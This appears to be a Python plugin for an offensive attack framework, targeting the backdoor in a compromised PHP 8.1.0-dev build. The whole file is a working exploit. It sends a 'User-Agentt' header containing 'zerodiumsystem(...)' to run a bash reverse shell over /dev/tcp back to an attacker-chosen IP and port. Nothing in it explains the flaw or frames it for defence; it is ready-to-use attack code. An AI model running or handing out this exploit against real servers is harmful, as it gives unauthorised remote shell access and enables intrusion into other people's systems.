
# [PLUGIN INITIAL ACCESS] PHP 8.1.0-dev backdoor

import requests

def exploit(ip_dest: str, port_dest: int, ip_src: str, port_src: int) -> bool | Exception:
    """
    Try to exploit the vulnerability
    """
    request = requests.Session()
    host = 'http://{0}:{1}'.format(ip_dest, port_dest)
    try:
        print('[+] Attempting to gain initial access with php 8.1.0-dev backdoor on {}'.format(host))
        r = requests.get(host)
        rs = 'bash -c "/bin/sh -i >& /dev/tcp/{0}/{1} 0>&1"'.format(ip_src, port_src)
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + rs + "');"
        }
        response = request.get(host, headers = headers, allow_redirects = False)
        print(response)
        return True
    except Exception as e:
        return e